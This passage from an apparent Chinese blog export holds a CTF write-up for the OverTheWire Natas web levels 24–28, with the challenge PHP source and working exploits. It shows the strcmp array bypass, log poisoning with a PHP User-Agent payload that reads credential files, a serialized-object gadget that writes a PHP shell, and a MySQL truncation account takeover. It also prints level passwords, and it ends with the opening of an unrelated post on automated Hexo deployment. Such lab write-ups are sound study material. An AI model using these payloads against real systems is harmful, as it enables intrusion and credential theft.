<p>提交的密码既存在 <code>iloveyou</code> ，又要大于10即可得到密码 <code>20iloveyou</code></p>
<ul>
<li>PHP 中字符串和数字的大小比较：<ul>
<li>从字符串起始位置截取数字部分，如果没有则为0 <img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200211124502912.png" alt="image-20200211124502912"></li>
</ul>
</li>
</ul>
<h2 id="Level-24"><a href="#Level-24" class="headerlink" title="Level 24"></a>Level 24</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">OsRmXFguozKpTZZ5X14zNO43379LZveg</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">array_key_exists</span>(<span class="string">&quot;passwd&quot;</span>,<span class="variable">$_REQUEST</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">strcmp</span>(<span class="variable">$_REQUEST</span>[<span class="string">&quot;passwd&quot;</span>],<span class="string">&quot;&lt;censored&gt;&quot;</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;The credentials for the next level are:&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Username: natas25 Password: &lt;censored&gt;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;Wrong!&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// morla / 10111</span></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>利用strcmp报错绕过：（当提交的passwd是一个数组或是一个Object时即可绕过）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://natas24.natas.labs.overthewire.org/?passwd[]=1</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200211124912818.png" alt="image-20200211124912818"></p>
<h2 id="Level-25"><a href="#Level-25" class="headerlink" title="Level 25"></a>Level 25</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">GHF6X7YwACaYYssHVY05cFq83hRktl4c</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">// cheers and &lt;3 to malvina</span></span><br><span class="line">    <span class="comment">// - morla</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">setLanguage</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">/* language setup */</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">array_key_exists</span>(<span class="string">&quot;lang&quot;</span>,<span class="variable">$_REQUEST</span>))</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">safeinclude</span>(<span class="string">&quot;language/&quot;</span> . <span class="variable">$_REQUEST</span>[<span class="string">&quot;lang&quot;</span>] ))</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        <span class="title function_ invoke__">safeinclude</span>(<span class="string">&quot;language/en&quot;</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">safeinclude</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">        <span class="comment">// check for directory traversal</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strstr</span>(<span class="variable">$filename</span>,<span class="string">&quot;../&quot;</span>))&#123;</span><br><span class="line">            <span class="title function_ invoke__">logRequest</span>(<span class="string">&quot;Directory traversal attempt! fixing request.&quot;</span>);</span><br><span class="line">            <span class="variable">$filename</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;../&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$filename</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// dont let ppl steal our passwords</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strstr</span>(<span class="variable">$filename</span>,<span class="string">&quot;natas_webpass&quot;</span>))&#123;</span><br><span class="line">            <span class="title function_ invoke__">logRequest</span>(<span class="string">&quot;Illegal file access detected! Aborting!&quot;</span>);</span><br><span class="line">            <span class="keyword">exit</span>(-<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// add more checks...</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>)) &#123; </span><br><span class="line">            <span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">listFiles</span>(<span class="params"><span class="variable">$path</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$listoffiles</span>=<span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$handle</span> = <span class="title function_ invoke__">opendir</span>(<span class="variable">$path</span>))</span><br><span class="line">            <span class="keyword">while</span> (<span class="literal">false</span> !== (<span class="variable">$file</span> = <span class="title function_ invoke__">readdir</span>(<span class="variable">$handle</span>)))</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$file</span> != <span class="string">&quot;.&quot;</span> &amp;&amp; <span class="variable">$file</span> != <span class="string">&quot;..&quot;</span>)</span><br><span class="line">                    <span class="variable">$listoffiles</span>[]=<span class="variable">$file</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="title function_ invoke__">closedir</span>(<span class="variable">$handle</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$listoffiles</span>;</span><br><span class="line">    &#125; </span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">logRequest</span>(<span class="params"><span class="variable">$message</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$log</span>=<span class="string">&quot;[&quot;</span>. <span class="title function_ invoke__">date</span>(<span class="string">&quot;d.m.Y H::i:s&quot;</span>,<span class="title function_ invoke__">time</span>()) .<span class="string">&quot;]&quot;</span>;</span><br><span class="line">        <span class="variable">$log</span>=<span class="variable">$log</span> . <span class="string">&quot; &quot;</span> . <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>];</span><br><span class="line">        <span class="variable">$log</span>=<span class="variable">$log</span> . <span class="string">&quot; \&quot;&quot;</span> . <span class="variable">$message</span> .<span class="string">&quot;\&quot;\n&quot;</span>; </span><br><span class="line">        <span class="variable">$fd</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;/var/www/natas/natas25/logs/natas25_&quot;</span> . <span class="title function_ invoke__">session_id</span>() .<span class="string">&quot;.log&quot;</span>,<span class="string">&quot;a&quot;</span>);</span><br><span class="line">        <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fd</span>,<span class="variable">$log</span>);</span><br><span class="line">        <span class="title function_ invoke__">fclose</span>(<span class="variable">$fd</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>目录遍历，这里只是将 <code>../</code> 替换为空，可以通过双写绕过 <code>....//</code> </p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200211150859737.png" alt="可以看到当前路径"></p>
<p>因为后续将  <code>natas_webpass </code> 置于黑名单了，所以不能直接读取，那么就要利用后面的写日志操间接读取，根据函数中的命名，查看当前SID的日志</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200211151156489.png" alt="image-20200211151156489"></p>
<p>在 User-Agent 处进行构造：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">User-Agent: <span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/etc/natas_webpass/natas26&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p> 再次请求即可得到密码：</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200211151934402.png" alt="image-20200211151934402"></p>
<h2 id="Level-26"><a href="#Level-26" class="headerlink" title="Level 26"></a>Level 26</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T</span><br></pre></td></tr></table></figure>

<p>查看源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">// sry, this is ugly as hell.</span></span><br><span class="line">    <span class="comment">// cheers kaliman ;)</span></span><br><span class="line">    <span class="comment">// - morla</span></span><br><span class="line">    </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Logger</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$logFile</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$initMsg</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$exitMsg</span>;</span><br><span class="line">      </span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">            <span class="comment">// initialise variables</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;initMsg=<span class="string">&quot;#--session started--#\n&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;exitMsg=<span class="string">&quot;#--session end--#\n&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;logFile = <span class="string">&quot;/tmp/natas26_&quot;</span> . <span class="variable">$file</span> . <span class="string">&quot;.log&quot;</span>;</span><br><span class="line">      </span><br><span class="line">            <span class="comment">// write initial message</span></span><br><span class="line">            <span class="variable">$fd</span>=<span class="title function_ invoke__">fopen</span>(<span class="variable">$this</span>-&gt;logFile,<span class="string">&quot;a+&quot;</span>);</span><br><span class="line">            <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fd</span>,<span class="variable">$initMsg</span>);</span><br><span class="line">            <span class="title function_ invoke__">fclose</span>(<span class="variable">$fd</span>);</span><br><span class="line">        &#125;                       </span><br><span class="line">      </span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">log</span>(<span class="params"><span class="variable">$msg</span></span>)</span>&#123;</span><br><span class="line">            <span class="variable">$fd</span>=<span class="title function_ invoke__">fopen</span>(<span class="variable">$this</span>-&gt;logFile,<span class="string">&quot;a+&quot;</span>);</span><br><span class="line">            <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fd</span>,<span class="variable">$msg</span>.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">            <span class="title function_ invoke__">fclose</span>(<span class="variable">$fd</span>);</span><br><span class="line">        &#125;                       </span><br><span class="line">      </span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="comment">// write exit message</span></span><br><span class="line">            <span class="variable">$fd</span>=<span class="title function_ invoke__">fopen</span>(<span class="variable">$this</span>-&gt;logFile,<span class="string">&quot;a+&quot;</span>);</span><br><span class="line">            <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fd</span>,<span class="variable">$this</span>-&gt;exitMsg);</span><br><span class="line">            <span class="title function_ invoke__">fclose</span>(<span class="variable">$fd</span>);</span><br><span class="line">        &#125;                       </span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">showImage</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>))</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=\&quot;<span class="subst">$filename</span>\&quot;&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">drawImage</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$img</span>=<span class="title function_ invoke__">imagecreatetruecolor</span>(<span class="number">400</span>,<span class="number">300</span>);</span><br><span class="line">        <span class="title function_ invoke__">drawFromUserdata</span>(<span class="variable">$img</span>);</span><br><span class="line">        <span class="title function_ invoke__">imagepng</span>(<span class="variable">$img</span>,<span class="variable">$filename</span>);     </span><br><span class="line">        <span class="title function_ invoke__">imagedestroy</span>(<span class="variable">$img</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">drawFromUserdata</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>( <span class="title function_ invoke__">array_key_exists</span>(<span class="string">&quot;x1&quot;</span>, <span class="variable">$_GET</span>) &amp;&amp; <span class="title function_ invoke__">array_key_exists</span>(<span class="string">&quot;y1&quot;</span>, <span class="variable">$_GET</span>) &amp;&amp;</span><br><span class="line">            <span class="title function_ invoke__">array_key_exists</span>(<span class="string">&quot;x2&quot;</span>, <span class="variable">$_GET</span>) &amp;&amp; <span class="title function_ invoke__">array_key_exists</span>(<span class="string">&quot;y2&quot;</span>, <span class="variable">$_GET</span>))&#123;</span><br><span class="line">        </span><br><span class="line">            <span class="variable">$color</span>=<span class="title function_ invoke__">imagecolorallocate</span>(<span class="variable">$img</span>,<span class="number">0xff</span>,<span class="number">0x12</span>,<span class="number">0x1c</span>);</span><br><span class="line">            <span class="title function_ invoke__">imageline</span>(<span class="variable">$img</span>,<span class="variable">$_GET</span>[<span class="string">&quot;x1&quot;</span>], <span class="variable">$_GET</span>[<span class="string">&quot;y1&quot;</span>], </span><br><span class="line">                            <span class="variable">$_GET</span>[<span class="string">&quot;x2&quot;</span>], <span class="variable">$_GET</span>[<span class="string">&quot;y2&quot;</span>], <span class="variable">$color</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">array_key_exists</span>(<span class="string">&quot;drawing&quot;</span>, <span class="variable">$_COOKIE</span>))&#123;</span><br><span class="line">            <span class="variable">$drawing</span>=<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;drawing&quot;</span>]));</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$drawing</span>)</span><br><span class="line">                <span class="keyword">foreach</span>(<span class="variable">$drawing</span> <span class="keyword">as</span> <span class="variable">$object</span>)</span><br><span class="line">                    <span class="keyword">if</span>( <span class="title function_ invoke__">array_key_exists</span>(<span class="string">&quot;x1&quot;</span>, <span class="variable">$object</span>) &amp;&amp; </span><br><span class="line">                        <span class="title function_ invoke__">array_key_exists</span>(<span class="string">&quot;y1&quot;</span>, <span class="variable">$object</span>) &amp;&amp;</span><br><span class="line">                        <span class="title function_ invoke__">array_key_exists</span>(<span class="string">&quot;x2&quot;</span>, <span class="variable">$object</span>) &amp;&amp; </span><br><span class="line">                        <span class="title function_ invoke__">array_key_exists</span>(<span class="string">&quot;y2&quot;</span>, <span class="variable">$object</span>))&#123;</span><br><span class="line">                    </span><br><span class="line">                        <span class="variable">$color</span>=<span class="title function_ invoke__">imagecolorallocate</span>(<span class="variable">$img</span>,<span class="number">0xff</span>,<span class="number">0x12</span>,<span class="number">0x1c</span>);</span><br><span class="line">                        <span class="title function_ invoke__">imageline</span>(<span class="variable">$img</span>,<span class="variable">$object</span>[<span class="string">&quot;x1&quot;</span>],<span class="variable">$object</span>[<span class="string">&quot;y1&quot;</span>],</span><br><span class="line">                                <span class="variable">$object</span>[<span class="string">&quot;x2&quot;</span>] ,<span class="variable">$object</span>[<span class="string">&quot;y2&quot;</span>] ,<span class="variable">$color</span>);</span><br><span class="line">            </span><br><span class="line">                    &#125;</span><br><span class="line">        &#125;    </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">storeData</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$new_object</span>=<span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">array_key_exists</span>(<span class="string">&quot;x1&quot;</span>, <span class="variable">$_GET</span>) &amp;&amp; <span class="title function_ invoke__">array_key_exists</span>(<span class="string">&quot;y1&quot;</span>, <span class="variable">$_GET</span>) &amp;&amp;</span><br><span class="line">            <span class="title function_ invoke__">array_key_exists</span>(<span class="string">&quot;x2&quot;</span>, <span class="variable">$_GET</span>) &amp;&amp; <span class="title function_ invoke__">array_key_exists</span>(<span class="string">&quot;y2&quot;</span>, <span class="variable">$_GET</span>))&#123;</span><br><span class="line">            <span class="variable">$new_object</span>[<span class="string">&quot;x1&quot;</span>]=<span class="variable">$_GET</span>[<span class="string">&quot;x1&quot;</span>];</span><br><span class="line">            <span class="variable">$new_object</span>[<span class="string">&quot;y1&quot;</span>]=<span class="variable">$_GET</span>[<span class="string">&quot;y1&quot;</span>];</span><br><span class="line">            <span class="variable">$new_object</span>[<span class="string">&quot;x2&quot;</span>]=<span class="variable">$_GET</span>[<span class="string">&quot;x2&quot;</span>];</span><br><span class="line">            <span class="variable">$new_object</span>[<span class="string">&quot;y2&quot;</span>]=<span class="variable">$_GET</span>[<span class="string">&quot;y2&quot;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">array_key_exists</span>(<span class="string">&quot;drawing&quot;</span>, <span class="variable">$_COOKIE</span>))&#123;</span><br><span class="line">            <span class="variable">$drawing</span>=<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;drawing&quot;</span>]));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="comment">// create new array</span></span><br><span class="line">            <span class="variable">$drawing</span>=<span class="keyword">array</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="variable">$drawing</span>[]=<span class="variable">$new_object</span>;</span><br><span class="line">        <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;drawing&quot;</span>,<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$drawing</span>)));</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>可利用的是反序列化，构造</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Logger</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$logFile</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$initMsg</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$exitMsg</span>;</span><br><span class="line">      </span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;initMsg=<span class="string">&quot;&lt;?php echo file_get_contents(&#x27;/etc/natas_webpass/natas27&#x27;);?&gt;\n&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;exitMsg=<span class="string">&quot;&lt;?php echo file_get_contents(&#x27;/etc/natas_webpass/natas27&#x27;);?&gt;\n&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;logFile = <span class="string">&quot;img/ttt.php&quot;</span>;</span><br><span class="line">        &#125;                              </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Logger</span>(<span class="string">&#x27;a.php&#x27;</span>)));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>替换Cookie中的drawing字段值，然后访问 <code>img/ttt.php</code> 即可得到下一关密码</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200211163741465.png" alt="image-20200211163741465"></p>
<h2 id="Level-27"><a href="#Level-27" class="headerlink" title="Level 27"></a>Level 27</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ </span><br></pre></td></tr></table></figure>

<blockquote>
<p>参考链接：<a href="https://www.cnblogs.com/liqiuhao/p/6906474.html">https://www.cnblogs.com/liqiuhao/p/6906474.html</a></p>
</blockquote>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&lt;?</span><br><span class="line"></span><br><span class="line">// morla / 10111</span><br><span class="line">// database gets cleared every 5 min </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line">CREATE TABLE `users` (</span><br><span class="line">  `username` varchar(64) DEFAULT NULL,</span><br><span class="line">  `password` varchar(64) DEFAULT NULL</span><br><span class="line">);</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function checkCredentials($link,$usr,$pass)&#123;</span><br><span class="line"> </span><br><span class="line">    $user=mysql_real_escape_string($usr);</span><br><span class="line">    $password=mysql_real_escape_string($pass);</span><br><span class="line">    </span><br><span class="line">    $query = &quot;SELECT username from users where username=&#x27;$user&#x27; and password=&#x27;$password&#x27; &quot;;</span><br><span class="line">    SELECT username from users where username=&#x27;natas28&#x27; and password=&#x27;&#x27; </span><br><span class="line">    $res = mysql_query($query, $link);</span><br><span class="line">    if(mysql_num_rows($res) &gt; 0)&#123;</span><br><span class="line">        return True;</span><br><span class="line">    &#125;</span><br><span class="line">    return False;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function validUser($link,$usr)&#123;</span><br><span class="line">    </span><br><span class="line">    $user=mysql_real_escape_string($usr);</span><br><span class="line">    </span><br><span class="line">    $query = &quot;SELECT * from users where username=&#x27;$user&#x27;&quot;;</span><br><span class="line">    $res = mysql_query($query, $link);</span><br><span class="line">    if($res) &#123;</span><br><span class="line">        if(mysql_num_rows($res) &gt; 0) &#123;</span><br><span class="line">            return True;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return False;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function dumpData($link,$usr)&#123;</span><br><span class="line">    </span><br><span class="line">    $user=mysql_real_escape_string($usr);</span><br><span class="line">    </span><br><span class="line">    $query = &quot;SELECT * from users where username=&#x27;$user&#x27;&quot;;</span><br><span class="line">    $res = mysql_query($query, $link);</span><br><span class="line">    if($res) &#123;</span><br><span class="line">        if(mysql_num_rows($res) &gt; 0) &#123;</span><br><span class="line">            while ($row = mysql_fetch_assoc($res)) &#123;</span><br><span class="line">                // thanks to Gobo for reporting this bug!  </span><br><span class="line">                //return print_r($row);</span><br><span class="line">                return print_r($row,true);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return False;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function createUser($link, $usr, $pass)&#123;</span><br><span class="line"></span><br><span class="line">    $user=mysql_real_escape_string($usr);</span><br><span class="line">    $password=mysql_real_escape_string($pass);</span><br><span class="line">    </span><br><span class="line">    $query = &quot;INSERT INTO users (username,password) values (&#x27;$user&#x27;,&#x27;$password&#x27;)&quot;;</span><br><span class="line">    $res = mysql_query($query, $link);</span><br><span class="line">    if(mysql_affected_rows() &gt; 0)&#123;</span><br><span class="line">        return True;</span><br><span class="line">    &#125;</span><br><span class="line">    return False;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(array_key_exists(&quot;username&quot;, $_REQUEST) and array_key_exists(&quot;password&quot;, $_REQUEST)) &#123;</span><br><span class="line">    $link = mysql_connect(&#x27;localhost&#x27;, &#x27;natas27&#x27;, &#x27;<span class="tag">&lt;<span class="name">censored</span>&gt;</span>&#x27;);</span><br><span class="line">    mysql_select_db(&#x27;natas27&#x27;, $link);</span><br><span class="line">   </span><br><span class="line"></span><br><span class="line">    if(validUser($link,$_REQUEST[&quot;username&quot;])) &#123;</span><br><span class="line">        //user exists, check creds</span><br><span class="line">        if(checkCredentials($link,$_REQUEST[&quot;username&quot;],$_REQUEST[&quot;password&quot;]))&#123;</span><br><span class="line">            echo &quot;Welcome &quot; . htmlentities($_REQUEST[&quot;username&quot;]) . &quot;!<span class="tag">&lt;<span class="name">br</span>&gt;</span>&quot;;</span><br><span class="line">            echo &quot;Here is your data:<span class="tag">&lt;<span class="name">br</span>&gt;</span>&quot;;</span><br><span class="line">            $data=dumpData($link,$_REQUEST[&quot;username&quot;]);</span><br><span class="line">            print htmlentities($data);</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            echo &quot;Wrong password for user: &quot; . htmlentities($_REQUEST[&quot;username&quot;]) . &quot;<span class="tag">&lt;<span class="name">br</span>&gt;</span>&quot;;</span><br><span class="line">        &#125;        </span><br><span class="line">    &#125; </span><br><span class="line">    else &#123;</span><br><span class="line">        //user doesn&#x27;t exist</span><br><span class="line">        if(createUser($link,$_REQUEST[&quot;username&quot;],$_REQUEST[&quot;password&quot;]))&#123; </span><br><span class="line">            echo &quot;User &quot; . htmlentities($_REQUEST[&quot;username&quot;]) . &quot; was created!&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mysql_close($link);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;index.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">Username: <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">Password: <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;login&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">&lt;? &#125; ?&gt; </span><br></pre></td></tr></table></figure>

<p>MySQL 中：</p>
<ol>
<li>字符串<strong>存储时</strong>若发生“溢出”，mysql会自动truncate到最大宽度。</li>
<li>空格在varchar里面会被自动删除。</li>
</ol>
<p>思路：</p>
<ul>
<li>注册一个新用户，用户名是 natas28 后拼接很多空格（超过64字节）再拼接任意字符，密码随便写，造成字符串存储时的”溢出”, 经过数据库去除空格后用户名就会变成 natas28</li>
<li>使用 natas28 和刚刚设置的密码登录</li>
</ul>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200212184943145.png" alt="image-20200212184943145"></p>
<h2 id="Level-28"><a href="#Level-28" class="headerlink" title="Level 28"></a>Level 28</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">JWwR438wkgTsNKBbcJoowyysdM82YjeF</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>Writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo 博客自动化部署</title>
    <url>/2023/07/07/auto-hexo/</url>
    <content><![CDATA[<h1 id="使用-Github-Actions-自动化部署-Hexo-博客"><a href="#使用-Github-Actions-自动化部署-Hexo-博客" class="headerlink" title="使用 Github Actions 自动化部署 Hexo 博客"></a>使用 Github Actions 自动化部署 Hexo 博客</h1><blockquote>
<p>2023.07.29 更新: 不使用原来的 <code>Personal access tokens (classic)</code>，改用新版的 <code>Fine-grained personal access tokens</code></p>
</blockquote>
<p>环境信息:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hexo: 6.3.0</span><br><span class="line">hexo-cli: 4.3.0</span><br><span class="line">os: darwin 22.5.0 13.4.1</span><br><span class="line">node: 20.3.0</span><br></pre></td></tr></table></figure>

<h2 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h2><p>首先最基本的：</p>
<ol>
<li>会用 Git 以及 Github (废话)</li>
<li>会用 Hexo 搭建博客 🤔<ul>
<li>头一次用 Hexo 也问题不大，<a href="https://hexo.io/zh-cn/docs/">官方文档</a>写的很详细，照着操作就会了</li>
<li>重点关注如何修改配置文件<ul>
<li><code>_config.yml</code> (hexo 配置文件: 看<a href="https://hexo.io/zh-cn/docs/configuration">官方文档</a>)</li>
<li><code>_config.xxxx.yml</code> (xxxx主题的配置文件: 看对应主题的文档, 例如正在用的 <a href="https://theme-next.js.org/docs/theme-settings/">NexT</a>)</li>
</ul>
</li>
</ul>
</li>
</ol>
